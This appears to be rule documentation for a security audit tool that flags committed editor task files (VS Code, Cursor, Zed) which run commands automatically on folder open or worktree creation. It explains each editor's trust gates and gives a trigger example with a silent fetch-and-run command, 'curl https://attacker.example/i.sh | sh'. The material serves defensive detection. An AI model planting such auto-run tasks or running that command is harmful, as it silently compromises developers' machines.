# CFG047 — a committed task file auto-runs a command

**Severity:** `error` (VS Code `folderOpen`) · `warn` (a `folderOpen` task that only runs the project's own build, watch, dev-server, test or dependency-sync command; Zed hook task)
**OWASP:** [LLM03:2026 – Excessive Agency](https://github.com/GenAI-Security-Project/GenAI-LLM-Top10/blob/main/2026/final/LLM03_ExcessiveAgency.md)
**Agents:** cursor, devin-desktop, vscode, zed

## What cfgaudit checks

`.vscode/tasks.json` is committed into repositories and read by VS Code **and its forks (Cursor, Windsurf)**. A task whose `runOptions.runOn` is `"folderOpen"` executes **automatically when the folder is opened**, with no command, chat or agent action, once the gates below are open. This is the cross-agent analogue of Claude Code's command-execution rules (CFG008/CFG028): repo-controlled config that runs code on the developer's machine.

cfgaudit flags every task with `runOptions.runOn: "folderOpen"`, naming the task (`label`, or `command` when unlabelled). When the task also sets `presentation.reveal: "never"` the execution is silent — the message calls this out, as silent auto-run is the hallmark of the in-the-wild attack.

### What stands between the task and its execution (#1181)

Measured on VS Code 1.116 with a fresh profile and an inert task. The checks in `runAutomaticTasks.ts` are the same in the source of 1.145.2:

| Step | Result |
| --- | --- |
| Open the folder | the workspace trust dialog; the task does not run |
| Trust the folder | a notification names the task and asks to Allow or Disallow automatic tasks; the task does not run |
| Allow | the task runs, and `task.allowAutomaticTasks` is `on` in the user settings |
| Reopen a trusted folder with a task | the task runs, with no prompt |

`task.allowAutomaticTasks` defaults to `off`, and it is an application setting, so a repository cannot set it. The prompt appears once per workspace. Closing it, or Disallow, leaves the task unstarted.

So a first open in VS Code needs two clicks, and after one Allow, in any repository, a task runs on open in every folder the user trusts.

### Other editors (#1502)

The gates differ, and a task file cannot say which editor opens it, so the message names both cases, the weakest first. This table comes from reading the shipped code of each editor, without running it, except for VS Code:

| Editor | Workspace trust default | `task.allowAutomaticTasks` default | Prompt in the code | A task on a first open |
| --- | --- | --- | --- | --- |
| VS Code 1.116 (measured), 1.145.2 (read) | on, with a dialog | `off` | yes | runs after trust and Allow |
| Cursor 3.29.9 | **off** | **`on`** | **no** | **runs, with no prompt** |
| Windsurf, now Devin 1.126.0 (3.11.238) | on, `startupPrompt` `never` | `off` | yes | waits for trust and Allow |

So in Cursor with default settings a committed `folderOpen` task is zero-click: `_runWithPermission` only checks that the setting is not `off`, and with workspace trust off every folder counts as trusted. A team can turn workspace trust on through its admin settings.

In Windsurf the trust dialog does not appear at startup. The code suggests such a folder stays untrusted until the user trusts it another way, which was not tried.

### Severity of a VS Code folder-open task (#1181)

A `folderOpen` task stays `error`, except when it only runs the project's own dev workflow. Then it is `warn`. That covers:

- a chain of steps joined by `&&` or `;`, each a package manager running a build, watch, dev, start, test, lint or install script (`npm run watch`, `pnpm install --frozen-lockfile`, `yarn start`);
- `tsc` in build or watch mode, `uv sync`, `cargo build`, `make`, `docker compose up` and the like;
- an `npm` task whose script name is one of those;
- a `typescript` task;
- a compound task whose `dependsOn` names only such tasks.

Every per-platform command (`windows`, `linux`, `osx`) has to qualify too, and a pipe, redirect, substitution or download keeps the task at `error`.

A task that runs a file inside an agent or editor configuration directory (`.claude/`, `.vscode/`, `.cursor/`, ...) is always `error`, and the message says so. That is where the implants found in the pre-release corpus run for v1.20.0 kept the script their task started (`node .claude/setup.mjs`); [CFG119](CFG119.md) reports the script itself.

In that run on 10,034 repositories, this moved 12 of the 28 `folderOpen` errors to `warn`. Both implants stay `error`.

## Zed — `.zed/tasks.json` hook tasks

Zed's worktree-local task file is a JSON array of task templates, and a template may carry a `hooks` entry. Zed's `TaskHook` enum has one variant today, serialized `create_worktree` (with `create_git_worktree` accepted as a serde alias, which cfgaudit also matches). `run_create_worktree_tasks` resolves the matching templates and calls `spawn_in_terminal` directly, so the command runs **with no approval prompt for it**.

**Why `warn` and not `error`.** The trigger is narrower than `folderOpen`: creating a git worktree is a deliberate user action, so this is not the folder-open case the `error` covers. What the user is never asked about is the command.

**The file is not trust-gated, and that is the interesting part.** Zed's `SettingsObserver` handles both local files, and treats them differently:

```rust
(InWorktree(directory), LocalSettingsKind::Settings) => {
    if *can_trust_worktree.get_or_init(...) { apply_local_settings(...) }   // gated
    else { /* held pending until the worktree is trusted */ }
}
(InWorktree(directory), LocalSettingsKind::Tasks) => {
    task_store.update_user_tasks(...)                                       // no trust check
}
```

So `.zed/settings.json` waits for worktree trust while `.zed/tasks.json` is applied unconditionally. This is also why the two Zed settings keys that look like obvious findings — `agent.always_allow_tool_actions` and `agent.sandbox_permissions` — are **not** rules: neither is in `ProjectSettingsContent`, so serde drops them from a committed settings file entirely.

A task with `reveal: "never"` is called out the same way as VS Code's silent variant. A task **without** a `hooks` entry is not flagged: that is one the user picks from the task list, no more a committed-execution surface than a Makefile target.

The command behind a hook task is judged separately by the command-content rules, which is where a dangerous one earns its `error`.

The `tasks` block of a `*.code-workspace` file at the repository root is checked the same way (#988). VS Code offers to open such a file, and its automatic-task check collects workspace-file tasks together with the folder's `.vscode/tasks.json`, behind the same prompt.

A `.vscode/tasks.json` with no `folderOpen` task produces no finding. The file is JSONC (comments and trailing commas), which cfgaudit tolerates; a file that still fails to parse is reported as a tool error rather than silently trusted.

## Trigger example

```jsonc path=.vscode/tasks.json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "command": "curl https://attacker.example/i.sh | sh",
      "runOptions": { "runOn": "folderOpen" },
      "presentation": { "reveal": "never" }
    }
  ]
}
```

→ `error` — runs silently as soon as the repo is opened.

## Safe alternative

Remove `runOptions` (or set `runOn` to `"default"`) so the task only runs when explicitly invoked via **Run Task**:

```jsonc
{ "label": "bootstrap", "type": "shell", "command": "make bootstrap" }
```

If a folder-open task is genuinely needed, remember that each user allows automatic tasks for all their trusted workspaces at once, so a prompt here teaches them to accept it everywhere.
